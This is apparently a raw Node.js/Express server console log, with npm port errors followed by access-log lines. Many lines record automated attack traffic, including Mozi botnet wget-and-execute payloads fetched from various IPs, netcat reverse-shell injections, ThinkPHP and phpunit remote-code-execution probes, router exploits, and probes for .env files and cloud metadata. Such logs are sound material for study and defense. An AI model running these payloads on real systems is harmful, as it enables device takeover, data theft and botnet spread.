Port 3000 is already in use
Port 3000 is already in use
Port 3000 is already in use

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

Port 80 is already in use
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2020-09-15T22_26_26_309Z-debug.log

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [32m200 [0m410.128 ms - 239[0m
[0mGET /stylesheets/style.css [32m200 [0m5.109 ms - 111[0m
[0mGET / [32m200 [0m12.227 ms - 239[0m
[0mGET / [32m200 [0m9.440 ms - 239[0m
[0mGET / [32m200 [0m11.180 ms - 239[0m
[0mGET / [32m200 [0m19.318 ms - 239[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m41.659 ms - 1032[0m
[0mGET / [32m200 [0m9.549 ms - 239[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m12.285 ms - 1032[0m
[0mGET / [32m200 [0m6.281 ms - 239[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m9.877 ms - 239[0m
[0mGET / [32m200 [0m29.194 ms - 239[0m
[0mGET / [32m200 [0m4.554 ms - 239[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m28.363 ms - 239[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m7.816 ms - 1032[0m
[0mGET / [32m200 [0m8.718 ms - 239[0m
[0mGET / [32m200 [0m37.847 ms - 239[0m
[0mGET http://103.213.251.0/5.php [33m404 [0m16.076 ms - 1032[0m
[0mGET http://103.213.251.0/5.php [33m404 [0m5.353 ms - 1032[0m
[0mGET http://103.213.251.0/5.php [33m404 [0m11.553 ms - 1032[0m
[0mGET http://103.213.251.0/5.php [33m404 [0m4.483 ms - 1032[0m
[0mGET /portal/redlion [33m404 [0m13.649 ms - 1032[0m
[0mPOST /api/jsonws/invoke [33m404 [0m5.395 ms - 1032[0m
[0mGET / [32m200 [0m9.383 ms - 239[0m
[0mGET / [32m200 [0m3.982 ms - 239[0m
[0mGET / [32m200 [0m13.451 ms - 239[0m
[0mGET / [32m200 [0m6.089 ms - 239[0m
[0mGET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+89.248.166.183+1245+-e+%2Fbin%2Fsh%29 [33m404 [0m4.304 ms - 1032[0m
[0mGET /ftptest.cgi?loginuse=&loginpas= [33m404 [0m3.729 ms - 1032[0m
[0mGET / [32m200 [0m11.790 ms - 239[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m9.280 ms - 1032[0m
[0mGET / [32m200 [0m5.264 ms - 239[0m
[0mGET /c/ [33m404 [0m6.367 ms - 1032[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m4.873 ms - 1032[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m4.468 ms - 239[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m5.541 ms - 239[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m5.637 ms - 1032[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://27.6.123.69:39404/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m8.249 ms - 1032[0m
[0mHEAD / [32m200 [0m10.487 ms - 239[0m
[0mGET / [32m200 [0m3.142 ms - 239[0m
[0mPOST /api/jsonws/invoke [33m404 [0m4.604 ms - 1032[0m
[0mGET /TP/public/index.php [33m404 [0m5.860 ms - 1032[0m
[0mGET /TP/index.php [33m404 [0m5.965 ms - 1032[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m4.471 ms - 1032[0m
[0mGET /html/public/index.php [33m404 [0m4.266 ms - 1032[0m
[0mGET /public/index.php [33m404 [0m4.803 ms - 1032[0m
[0mGET /TP/html/public/index.php [33m404 [0m4.410 ms - 1032[0m
[0mGET /elrekt.php [33m404 [0m3.866 ms - 1032[0m
[0mGET /index.php [33m404 [0m4.531 ms - 1032[0m
[0mGET / [32m200 [0m9.628 ms - 239[0m
[0mGET /static/theme/img/login/bg1.jpg [33m404 [0m10.378 ms - 1032[0m
[0mGET / [32m200 [0m9.568 ms - 239[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m11.778 ms - 1032[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m4.837 ms - 1032[0m
[0mGET / [32m200 [0m4.069 ms - 239[0m
[0mGET / [32m200 [0m3.372 ms - 239[0m
[0mGET /hudson [33m404 [0m12.155 ms - 1032[0m
[0mGET /TP/public/index.php [33m404 [0m9.766 ms - 1032[0m
[0mGET /TP/index.php [33m404 [0m4.458 ms - 1032[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m10.695 ms - 1032[0m
[0mGET /html/public/index.php [33m404 [0m4.131 ms - 1032[0m
[0mGET /public/index.php [33m404 [0m11.564 ms - 1032[0m
[0mGET /TP/html/public/index.php [33m404 [0m5.828 ms - 1032[0m
[0mGET /elrekt.php [33m404 [0m4.993 ms - 1032[0m
[0mGET /index.php [33m404 [0m19.817 ms - 1032[0m
[0mGET / [32m200 [0m4.181 ms - 239[0m
[0mGET / [32m200 [0m13.296 ms - 239[0m
[0mGET /manager/html [33m404 [0m4.278 ms - 1032[0m
[0mGET / [32m200 [0m13.184 ms - 239[0m
[0mGET / [32m200 [0m10.277 ms - 239[0m
[0mGET / [32m200 [0m4.854 ms - 239[0m
[0mGET / [32m200 [0m3.970 ms - 239[0m
[0mGET / [32m200 [0m3.987 ms - 239[0m
[0mGET / [32m200 [0m8.647 ms - 239[0m
[0mGET / [32m200 [0m4.270 ms - 239[0m
[0mGET / [32m200 [0m3.872 ms - 239[0m
[0mGET / [32m200 [0m3.366 ms - 239[0m
[0mGET / [32m200 [0m4.041 ms - 239[0m
[0mGET / [32m200 [0m3.847 ms - 239[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.180.145.90:58567/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m4.815 ms - 1032[0m
[0mGET / [32m200 [0m11.841 ms - 239[0m
[0mGET /portal/redlion [33m404 [0m6.790 ms - 1032[0m
[0mGET / [32m200 [0m3.176 ms - 239[0m
[0mPOST /HNAP1/ [33m404 [0m3.766 ms - 1032[0m
[0mGET /muieblackcat [33m404 [0m19.022 ms - 1032[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m4.114 ms - 1032[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m8.926 ms - 1032[0m
[0mGET //pma/scripts/setup.php [33m404 [0m3.509 ms - 1032[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m4.026 ms - 1032[0m
[0mGET //MyAdmin/scripts/setup.php [33m404 [0m4.280 ms - 1032[0m
[0mGET //Admin/scripts/setup.php [33m404 [0m11.857 ms - 1032[0m
[0mGET //mysql/scripts/setup.php/db/scripts/setup.php/typo3/phpmyadmin/scripts/setup.php/web/phpMyAdmin/scripts/setup.php/web/scripts/setup.php/phpmyadmin2/scripts/setup.php/admin/scripts/setup.php/admin/phpmyadmin/scripts/setup.php/phpmyadmin1/scripts/setup.php/xampp/phpmyadmin/scripts/setup.php/php-my-admin/scripts/setup.php [33m404 [0m3.739 ms - 1032[0m
[0mGET / [32m200 [0m8.647 ms - 239[0m
[0mGET / [32m200 [0m9.670 ms - 239[0m
[0mGET / [32m200 [0m2.984 ms - 239[0m
[0mGET /.env [33m404 [0m5.650 ms - 1032[0m
[0mPOST / [33m404 [0m10.390 ms - 1032[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m4.791 ms - 1032[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://115.96.132.18:33745/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m8.610 ms - 1032[0m
[0mGET / [32m200 [0m3.404 ms - 239[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m4.146 ms - 1032[0m
[0mGET / [32m200 [0m2.984 ms - 239[0m
[0mGET / [32m200 [0m5.625 ms - 239[0m
[0mGET / [32m200 [0m8.843 ms - 239[0m
[0mGET / [32m200 [0m2.879 ms - 239[0m
[0mGET /stylesheets/style.css [32m200 [0m3.767 ms - 111[0m
[0mGET /favicon.ico [33m404 [0m8.668 ms - 1032[0m
[0mGET / [32m200 [0m5.418 ms - 239[0m
[0mGET /favicon.ico [33m404 [0m3.680 ms - 1032[0m
[0mGET /.env [33m404 [0m3.339 ms - 1032[0m
[0mPOST / [33m404 [0m3.578 ms - 1032[0m
[0mGET /config/getuser?index=0 [33m404 [0m3.949 ms - 1032[0m
[0mGET / [32m200 [0m3.697 ms - 239[0m
[0mGET /robots.txt [33m404 [0m3.451 ms - 1032[0m
[0mGET /sitemap.xml [33m404 [0m4.092 ms - 1032[0m
[0mGET /.well-known/security.txt [33m404 [0m3.977 ms - 1032[0m
[0mGET /favicon.ico [33m404 [0m3.988 ms - 1032[0m
[0mGET / [32m200 [0m3.080 ms - 239[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m14.465 ms - 1032[0m
[0mGET / [32m200 [0m3.750 ms - 239[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m4.356 ms - 239[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m9.981 ms - 239[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m4.863 ms - 1032[0m
[0mGET / [32m200 [0m3.061 ms - 239[0m
[0mGET / [32m200 [0m2.694 ms - 239[0m
[0mGET / [32m200 [0m3.721 ms - 239[0m
[0mGET /robots.txt [33m404 [0m11.125 ms - 1032[0m
[0mGET /sitemap.xml [33m404 [0m3.488 ms - 1032[0m
[0mGET /.well-known/security.txt [33m404 [0m6.198 ms - 1032[0m
[0mGET /favicon.ico [33m404 [0m3.850 ms - 1032[0m
[0mGET / [32m200 [0m3.819 ms - 239[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://60.243.113.80:54856/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m3.292 ms - 1032[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m4.311 ms - 1032[0m
[0mGET / [32m200 [0m3.725 ms - 239[0m
[0mGET / [32m200 [0m2.963 ms - 239[0m
[0mGET /.env [33m404 [0m3.476 ms - 1032[0m
[0mPOST / [33m404 [0m3.235 ms - 1032[0m
[0mGET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2083.97.20.130%2029312%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e [33m404 [0m3.956 ms - 1032[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://115.98.228.57:36698/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m3.297 ms - 1032[0m
[0mPOST /api/jsonws/invoke [33m404 [0m3.315 ms - 1032[0m
[0mGET http://169.254.169.254/latest/meta-data/ [33m404 [0m4.040 ms - 1032[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m4.846 ms - 1032[0m
[0mGET / [32m200 [0m2.911 ms - 239[0m
[0mGET / [32m200 [0m3.535 ms - 239[0m
[0mGET / [32m200 [0m3.525 ms - 239[0m
[0mGET /config/getuser?index=0 [33m404 [0m3.447 ms - 1032[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m12.783 ms - 1032[0m
[0mGET /manager/text/list [33m404 [0m4.007 ms - 1032[0m
[0mGET /.env [33m404 [0m3.834 ms - 1032[0m
[0mPOST / [33m404 [0m11.331 ms - 1032[0m
[0mGET / [32m200 [0m2.996 ms - 239[0m
[0mGET /manager/html [33m404 [0m3.983 ms - 1032[0m
[0mGET / [32m200 [0m3.663 ms - 239[0m
[0mGET /favicon.ico [33m404 [0m2.884 ms - 1032[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m3.754 ms - 1032[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m3.553 ms - 239[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m5.197 ms - 239[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m3.398 ms - 1032[0m
[0mGET / [32m200 [0m3.397 ms - 239[0m
[0mGET / [32m200 [0m3.029 ms - 239[0m
[0mGET / [32m200 [0m3.203 ms - 239[0m
[0mHEAD /robots.txt [33m404 [0m3.767 ms - 1032[0m
[0mGET /config/getuser?index=0 [33m404 [0m3.974 ms - 1032[0m
[0mGET / [32m200 [0m3.159 ms - 239[0m
[0mGET / [32m200 [0m3.087 ms - 239[0m
[0mGET / [32m200 [0m3.794 ms - 239[0m
[0mGET /.env [33m404 [0m3.648 ms - 1032[0m
[0mPOST / [33m404 [0m3.006 ms - 1032[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m4.095 ms - 1032[0m
[0mGET /favicon.ico [33m404 [0m4.003 ms - 1032[0m
[0mGET / [32m200 [0m3.169 ms - 239[0m
[0mGET / [32m200 [0m3.199 ms - 239[0m
[0mPOST /api/jsonws/invoke [33m404 [0m3.846 ms - 1032[0m
[0mGET / [32m200 [0m3.378 ms - 239[0m
[0mGET / [32m200 [0m2.968 ms - 239[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://37.19.53.45:44648/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m4.221 ms - 1032[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m3.890 ms - 1032[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m3.014 ms - 239[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m3.410 ms - 239[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m3.930 ms - 1032[0m
[0mGET / [32m200 [0m3.512 ms - 239[0m
[0mPOST /api/jsonws/invoke [33m404 [0m3.163 ms - 1032[0m
[0mGET / [32m200 [0m3.435 ms - 239[0m
[0mGET /hudson [33m404 [0m3.992 ms - 1032[0m
[0mGET /.env [33m404 [0m4.057 ms - 1032[0m
[0mGET / [32m200 [0m2.534 ms - 239[0m
[0mGET /v2/_catalog [33m404 [0m3.346 ms - 1032[0m
[0mGET /.git/config [33m404 [0m3.211 ms - 1032[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m4.236 ms - 1032[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.550 ms - 1032[0m
[0mGET / [32m200 [0m3.636 ms - 239[0m
[0mGET / [32m200 [0m3.795 ms - 239[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m3.154 ms - 1032[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m6.427 ms - 239[0m
[0mHEAD / [32m200 [0m3.556 ms - 239[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m2.965 ms - 239[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m4.651 ms - 1032[0m
[0mGET / [32m200 [0m3.672 ms - 239[0m
[0mGET / [32m200 [0m2.816 ms - 239[0m
[0mGET /favicon.ico [33m404 [0m2.792 ms - 1032[0m
[0mPOST /api/jsonws/invoke [33m404 [0m10.645 ms - 1032[0m
[0mGET /portal/redlion [33m404 [0m13.127 ms - 1032[0m
[0mGET / [32m200 [0m2.978 ms - 239[0m
[0mGET /favicon.ico [33m404 [0m4.989 ms - 1032[0m
[0mGET http://103.213.251.0/2.php [33m404 [0m12.453 ms - 1032[0m
[0mGET http://103.213.251.0/2.php [33m404 [0m3.356 ms - 1032[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.261 ms - 1032[0m
[0mGET /config/getuser?index=0 [33m404 [0m3.383 ms - 1032[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.97.196.161:51017/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m3.903 ms - 1032[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m4.045 ms - 1032[0m
[0mGET /TP/public/index.php [33m404 [0m3.692 ms - 1032[0m
[0mGET /TP/index.php [33m404 [0m2.984 ms - 1032[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m3.499 ms - 1032[0m
[0mGET /html/public/index.php [33m404 [0m4.040 ms - 1032[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://27.6.141.49:41636/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m3.134 ms - 1032[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.180.183.139:46061/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m3.345 ms - 1032[0m
[0mGET / [32m200 [0m3.523 ms - 239[0m
[0mGET / [32m200 [0m2.844 ms - 239[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m3.384 ms - 1032[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://60.243.162.143:49207/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m3.933 ms - 1032[0m
[0mGET / [32m200 [0m3.431 ms - 239[0m
[0mPOST /HNAP1/ [33m404 [0m3.096 ms - 1032[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.6.102.0:43662/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m3.413 ms - 1032[0m
[0mGET / [32m200 [0m3.508 ms - 239[0m
[0mGET / [32m200 [0m3.550 ms - 239[0m
[0mGET / [32m200 [0m2.336 ms - 239[0m
[0mGET / [32m200 [0m3.547 ms - 239[0m
[0mGET /.env [33m404 [0m3.826 ms - 1032[0m
[0mPOST / [33m404 [0m3.088 ms - 1032[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.116.33.123:47706/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m3.861 ms - 1032[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.202.161.11:59698/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m3.928 ms - 1032[0m
[0mGET / [32m200 [0m3.562 ms - 239[0m
[0mGET / [32m200 [0m2.807 ms - 239[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m3.746 ms - 1032[0m
[0mGET / [32m200 [0m3.304 ms - 239[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m2.676 ms - 239[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m3.415 ms - 239[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m3.844 ms - 1032[0m
[0mGET /hudson [33m404 [0m4.133 ms - 1032[0m
[0mGET /TP/public/index.php [33m404 [0m3.850 ms - 1032[0m
[0mGET /TP/index.php [33m404 [0m3.662 ms - 1032[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m3.805 ms - 1032[0m
[0mGET /html/public/index.php [33m404 [0m3.277 ms - 1032[0m
[0mGET /public/index.php [33m404 [0m3.731 ms - 1032[0m
[0mGET /TP/html/public/index.php [33m404 [0m3.839 ms - 1032[0m
[0mGET /elrekt.php [33m404 [0m3.720 ms - 1032[0m
[0mGET /index.php [33m404 [0m3.114 ms - 1032[0m
[0mGET / [32m200 [0m3.230 ms - 239[0m
[0mHEAD / [32m200 [0m3.474 ms - 239[0m
[0mGET / [32m200 [0m8.849 ms - 239[0m
[0mGET /.env [33m404 [0m3.691 ms - 1032[0m
[0mGET /.remote [33m404 [0m3.621 ms - 1032[0m
[0mGET /.local [33m404 [0m3.506 ms - 1032[0m
[0mGET /.production [33m404 [0m2.931 ms - 1032[0m
[0mPOST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.459 ms - 1032[0m
[0mPOST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.611 ms - 1032[0m
[0mPOST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.602 ms - 1032[0m
[0mPOST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.081 ms - 1032[0m
[0mPOST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.616 ms - 1032[0m
[0mPOST //crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m4.246 ms - 1032[0m
[0mPOST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.484 ms - 1032[0m
[0mPOST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.080 ms - 1032[0m
[0mPOST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m4.483 ms - 1032[0m
[0mPOST //lib/phpunit/Util/PHP/eval-stdin.php [33m404 [0m3.436 ms - 1032[0m
[0mPOST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php [33m404 [0m3.284 ms - 1032[0m
[0mPOST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m2.905 ms - 1032[0m
[0mPOST //lib/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.104 ms - 1032[0m
[0mPOST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.187 ms - 1032[0m
[0mPOST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.074 ms - 1032[0m
[0mPOST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m2.769 ms - 1032[0m
[0mPOST //phpunit/Util/PHP/eval-stdin.php [33m404 [0m2.951 ms - 1032[0m
[0mPOST //phpunit/phpunit/Util/PHP/eval-stdin.php [33m404 [0m2.929 ms - 1032[0m
[0mPOST //phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m2.785 ms - 1032[0m
[0mPOST //phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m2.819 ms - 1032[0m
[0mPOST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m2.792 ms - 1032[0m
[0mPOST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.026 ms - 1032[0m
[0mPOST //vendor/phpunit/Util/PHP/eval-stdin.php [33m404 [0m2.805 ms - 1032[0m
[0mPOST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php [33m404 [0m3.107 ms - 1032[0m
[0mPOST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.117 ms - 1032[0m
[0mPOST //vendor/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.028 ms - 1032[0m
[0mPOST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m2.705 ms - 1032[0m
[0mPOST //wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.082 ms - 1032[0m
[0mPOST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.148 ms - 1032[0m
[0mPOST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m2.994 ms - 1032[0m
[0mPOST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m2.696 ms - 1032[0m
[0mPOST /api/jsonws/invoke [33m404 [0m3.539 ms - 1032[0m
[0mGET / [32m200 [0m3.391 ms - 239[0m
[0mGET http://5.188.210.227/echo.php [33m404 [0m4.818 ms - 1032[0m
[0mGET / [32m200 [0m3.667 ms - 239[0m
[0mGET /favicon.ico [33m404 [0m3.497 ms - 1032[0m
[0mGET / [32m200 [0m2.881 ms - 239[0m
[0mGET / [32m200 [0m3.381 ms - 239[0m
[0mGET / [32m200 [0m2.922 ms - 239[0m
[0mGET / [32m200 [0m3.397 ms - 239[0m
[0mGET / [32m200 [0m3.438 ms - 239[0m
[0mGET / [32m200 [0m3.390 ms - 239[0m
[0mGET /TP/public/index.php [33m404 [0m3.870 ms - 1032[0m
[0mGET /TP/index.php [33m404 [0m6.796 ms - 1032[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m5.955 ms - 1032[0m
[0mGET /html/public/index.php [33m404 [0m3.752 ms - 1032[0m
[0mGET /public/index.php [33m404 [0m5.042 ms - 1032[0m
[0mGET /TP/html/public/index.php [33m404 [0m2.831 ms - 1032[0m
[0mGET /elrekt.php [33m404 [0m3.479 ms - 1032[0m
[0mGET /index.php [33m404 [0m3.264 ms - 1032[0m
[0mGET / [32m200 [0m2.894 ms - 239[0m
[0mGET /config/getuser?index=0 [33m404 [0m7.512 ms - 1032[0m
[0mGET / [32m200 [0m3.451 ms - 239[0m
[0mGET /robots.txt [33m404 [0m5.384 ms - 1032[0m
[0mGET /sitemap.xml [33m404 [0m2.753 ms - 1032[0m
[0mGET /.well-known/security.txt [33m404 [0m2.799 ms - 1032[0m
[0mGET /favicon.ico [33m404 [0m3.753 ms - 1032[0m
[0mGET /portal/redlion [33m404 [0m3.796 ms - 1032[0m
[0mGET / [32m200 [0m5.179 ms - 239[0m
[0mGET / [32m200 [0m8.089 ms - 239[0m
[0mGET / [32m200 [0m3.591 ms - 239[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m3.512 ms - 1032[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m3.621 ms - 1032[0m
[0mGET / [32m200 [0m3.650 ms - 239[0m
[0mPOST /goform/webLogin [33m404 [0m3.957 ms - 1032[0m
[0mGET /config/getuser?index=0 [33m404 [0m3.255 ms - 1032[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://61.52.57.205:34635/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m4.524 ms - 1032[0m
[0mGET / [32m200 [0m3.692 ms - 239[0m
[0mGET /.env [33m404 [0m2.984 ms - 1032[0m
[0mPOST / [33m404 [0m2.723 ms - 1032[0m
[0mGET / [32m200 [0m3.239 ms - 239[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m3.760 ms - 1032[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m3.115 ms - 1032[0m
[0mGET / [32m200 [0m3.338 ms - 239[0m
[0mGET /.env [33m404 [0m3.902 ms - 1032[0m
[0mPOST / [33m404 [0m3.429 ms - 1032[0m
[0mGET / [32m200 [0m2.798 ms - 239[0m
[0mGET / [32m200 [0m2.886 ms - 239[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m3.833 ms - 1032[0m
[0mGET / [32m200 [0m2.652 ms - 239[0m
[0mGET /favicon.ico [33m404 [0m3.330 ms - 1032[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m3.693 ms - 1032[0m
[0mGET /hudson [33m404 [0m3.928 ms - 1032[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m2.945 ms - 239[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m5.600 ms - 239[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m4.847 ms - 1032[0m
[0mGET / [32m200 [0m2.905 ms - 239[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m3.864 ms - 1032[0m
[0mGET / [32m200 [0m3.410 ms - 239[0m
[0mGET / [32m200 [0m2.954 ms - 239[0m
[0mPOST /api/jsonws/invoke [33m404 [0m3.727 ms - 1032[0m
[0mGET / [32m200 [0m3.427 ms - 239[0m
[0mGET /stylesheets/style.css [32m200 [0m1.175 ms - 111[0m
[0mGET /favicon.ico [33m404 [0m3.350 ms - 1032[0m
[0mGET / [36m304 [0m6.313 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m6.805 ms - -[0m
[0mGET / [36m304 [0m3.730 ms - -[0m
